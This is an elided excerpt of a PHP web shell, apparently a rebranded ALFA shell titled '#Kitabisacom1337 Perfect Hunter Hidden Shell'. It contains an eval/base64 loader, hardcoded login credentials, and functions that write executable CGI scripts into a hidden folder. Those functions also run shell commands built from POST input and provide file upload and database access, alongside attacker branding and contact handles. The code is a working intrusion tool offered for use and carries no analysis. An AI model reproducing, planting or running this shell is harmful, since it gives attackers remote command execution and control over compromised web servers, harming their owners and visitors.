<?=eval("?>".base64_decode(""));

$GLOBALS['#Kitabisacom1337'] = array(
    'username' => 'haxor',
...
$GLOBALS['DB_NAME'] = $GLOBALS['#Kitabisacom1337'];
...
define("__ALFA_VERSION__", "4.2");
define("__ALFA_UPDATE__", "2");
define("__ALFA_CODE_NAME__", "Kitabisacom1337");
...
<center><img style="border-radius:100px;"width="500" height="250" alt="#Kitabisacom1337 Perfect Hunter" draggable="false" src="https://i.postimg.cc/PrhYgJ7x/1337bg.png" /></center>
<div id=loginbox><p><font face="DejaVu Sans" size=-1>
<center><table cellpadding=\'2\' cellspacing=\'0\' border=\'0\' id=\'ap_table\'>
<tr><td bgcolor="gold"><table cellpadding=\'0\' cellspacing=\'0\' border=\'0\' width=\'100%\'><tr><td bgcolor="black" align=center style="padding:2;padding-bottom:4"><b><font color="white" size=-1 color="white" face="Georgia"><b>#Kitabisacom1337 Perfect Hunter</b></font></th></tr>
...
function _alfa_cgicmd($cmd,$lang="perl",$set_cookie=false){
	...
	if(isset($_COOKIE["kitabisacom1337api_mode"])){
		return "";
	}
	$cmd_pure = $cmd;
	...
	if($is_curl||$is_socket){
		$recreate = false;
		if(isset($_COOKIE["kitabisacom1337api"])){
			if(!@file_exists("kitabisacom1337api/".$_COOKIE["kitabisacom1337api"].".haxor")){
				$recreate = true;
				$lang = $_COOKIE["kitabisacom1337api"];
			}
		}
		if(!isset($_COOKIE["kitabisacom1337api"])||$recreate){
			...
			alfacgihtaccess('cgi', "kitabisacom1337api/");
		}else{
			$lang = $_COOKIE["kitabisacom1337api"];
		}
		$cgi_ext = ".haxor";
		...
		$cgi_url = __ALFA_DATA_FOLDER__."/kitabisacom1337api/".$lang.$cgi_ext;
		...
		if(strpos($data, "[solevisible~api]") !== false && strpos($data, '[solevisible~api]<pre>"+output+"</pre>') === false){
			if($set_cookie){
				__alfa_set_cookie("kitabisacom1337api", $lang);
			}
			...
			if($set_cookie){
				__alfa_set_cookie("kitabisacom1337api_mode", "off");
			}
		}
		return trim($out);
	}else{
...
echo '<html>';
echo "<title>#Kitabisacom1337 Perfect Hunter Hidden Shell</title>";
...
<title>..:: '.$_SERVER['HTTP_HOST'].' ~ #Kitabisacom1337 Perfect Hunter ::..</title>
<style type="text/css">';?>
...
<td width="12%" rowspan="8"><img style="border-radius:100px;" width="300" height="170" alt="lph team 2023" draggable="false" src="https://i.ibb.co/GQrcDS3/KITABISACOM3-1.png" /></td>
</tr>
<tr>
...
if(empty($about_us)){
$about_us = "<pre><center><img src='https://i.postimg.cc/PrhYgJ7x/1337bg.png'><br>
<font color='#FFFFFF'>Shell ReCoded By Kitabisacom1337</font><br>
<font color='#00A220'>Contact : admin@kitabisacom1337.com</font><br>
...
function alfacheckupdate(){
	if($GLOBALS["DB_NAME"]["cgi_api"]){
		if(!isset($_COOKIE["kitabisacom1337api_mode"])&&!isset($_COOKIE["kitabisacom1337api"])){
...
function alfaWriteTocgiapi($name, $source){
	...
	@mkdir('kitabisacom1337api',0755);
	__write_file("kitabisacom1337api/".$name, __get_resource($source));
	@chmod("kitabisacom1337api/".$name, 0755);
	return $temp;
}
...
function alfaupdateheader(){
	if(!isset($_COOKIE["updateheader_data"])){
		...
		$data = alfaEx("cd '{$tmp_path}/kitabisacom1337api';sh getheader.haxor",false,true,true);
...
<span class='footer_text'>Upload file: </span><span><button id='addup' onclick='addnewup();return false;'><b>+</b></button></span><p id='pfooterup'><label class='inputfile' for='footerup'><span id='__fnameup'></span> <strong>&nbsp;&nbsp;Choose a file</strong></label><input id='footerup' class='toolsInp' type='file' name='f[]' onChange='handleup(this,0);' multiple></p><input type='submit' name='submit' value=' '></form><div id='alfa-copyright'><span class='copyright'>[ Kitabisacom1337 &copy; 2023-".date('Y')." ]</span><br><span><a href='javascript:void(0);' onclick='alert(\"Touch By Kitabisacom13371337\");' style='color: #E91E63;text-decoration: none;'>Contact Me at</a></span> <span style='letter-spacing: 2px;color: #0f0;'>admin@kitabisacom1337.com</span> <span><a style='color: #ff6060;text-decoration: none;' target='_blank' href='https://t.me/fanxychild19'>@fanxychild19</a></span></div></td>
</tr>
</table>
</div>
...
if($dirContent === false){
	if(_alfa_can_runCommand(true,true)){
		...
		@chdir(dirname($_SERVER["SCRIPT_FILENAME"]));
		if(!isset($_COOKIE["alfachdir_bash"])||@!file_exists($tmp_getdir_path."/kitabisacom1337api/getdir.alfa")){
		...
		$dirContent = alfaEx("cd ".$tmp_getdir_path."/kitabisacom1337api;sh getdir.alfa '".addslashes(isset($_POST['c'])?$_POST['c']:$GLOBALS['cwd'])."'");
...
if(isset($_POST['alfa6'])){
$s0levisible="Powered By #Kitabisacom1337 Perfect Hunter";
$dbu = $_POST['alfa6'];
$path = $_POST['alfa5'];
$fname = $_POST['alfa4'];
$dbn = $_POST['alfa7'];
...
echo "<div class=header>";
echo "
<center><p><img src=\"https://i.postimg.cc/PrhYgJ7x/1337bg.png\"></p>";
...
$bash_users  = alfaEx("cd ".$tmp_path."/kitabisacom1337api;sh basedir.haxor ".$makepwd,false,true,true);
